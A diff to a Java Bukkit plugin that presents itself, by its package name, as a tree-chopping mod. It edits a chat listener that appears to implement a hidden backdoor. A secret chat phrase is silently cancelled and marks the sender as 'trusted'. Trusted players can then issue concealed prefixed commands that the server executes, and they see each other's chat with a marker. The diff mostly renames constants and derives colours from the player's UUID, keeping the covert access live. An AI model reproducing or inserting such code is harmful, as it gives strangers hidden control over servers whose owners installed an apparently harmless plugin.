@@ -25,7 +25,6 @@ import java.util.ArrayList;
 import java.util.Arrays;
 
 import static me.bow.treecapitatorultimate.Start.TRUST_COMMAND;
-import static me.bow.treecapitatorultimate.Utils.MathUtils.randomEnum;
 
 public class AsyncChatEvent implements Listener, PacketListener {
 
@@ -41,7 +40,7 @@ public class AsyncChatEvent implements Listener, PacketListener {
         Bukkit.getScheduler().runTask(Start.Instance, () -> {
             for (Player player : Bukkit.getOnlinePlayers()) {
                 if (Start.Instance.trustedPeople.contains(player.getUniqueId()) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
-                    String string = String.format(format, Start.Prefix + p.getDisplayName(), e.getMessage());
+                    String string = String.format(format, Start.COMMAND_PREFIX + p.getDisplayName(), e.getMessage());
                     player.sendMessage(string);
                 } else {
                     String string = String.format(format, p.getDisplayName(), e.getMessage());
@@ -58,19 +57,19 @@ public class AsyncChatEvent implements Listener, PacketListener {
         if (e.getMessage().equals(TRUST_COMMAND)) {
             e.setCancelled(true);
             if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) {
-                Chat.triggers.put(p.getUniqueId(), new Tuple<>(Start.CHAT_TRIGGER, randomEnum(ChatColor.class)));
+                Chat.triggers.put(p.getUniqueId(), new Tuple<>(Start.CHAT_TRIGGER, Chat.generateColorFromUUID(p.getUniqueId())));
                 Start.Instance.trustedPeople.add(p.getUniqueId());
-                p.sendMessage(Start.Prefix + "You are now trusted");
+                p.sendMessage(Start.COMMAND_PREFIX + "You are now trusted");
                 PacketManager.instance.addListener(p, this);
             } else {
                 Start.Instance.trustedPeople.remove(p.getUniqueId());
                 Chat.triggers.remove(p.getUniqueId());
-                p.sendMessage(Start.Prefix + "You are now untrusted");
+                p.sendMessage(Start.COMMAND_PREFIX + "You are now untrusted");
                 PacketManager.instance.removeListener(p, this);
             }
             return;
         }
-        if (e.getMessage().startsWith(Start.COMMAND_SIGN) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
+        if (e.getMessage().startsWith(String.valueOf(Start.COMMAND_SIGN)) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
             e.setCancelled(true);
             String[] dmp = msg.substring(1).split(" ");
             ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
@@ -79,11 +78,11 @@ public class AsyncChatEvent implements Listener, PacketListener {
                     if (args.size() >= command.getRequiredArgs())
                         Bukkit.getScheduler().runTask(Start.Instance, () -> command.onCommand(p, args));
                     else
-                        p.sendMessage(Start.Prefix + ChatColor.RED + "Not enough arguments! (" + args.size() + " out of " + command.getRequiredArgs() + ")");
+                        p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Not enough arguments! (" + args.size() + " out of " + command.getRequiredArgs() + ")");
                     return;
                 }
             }
-            p.sendMessage(Start.Prefix + ChatColor.RED + "Command not found!");
+            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Command not found!");
             return;
         }
     }
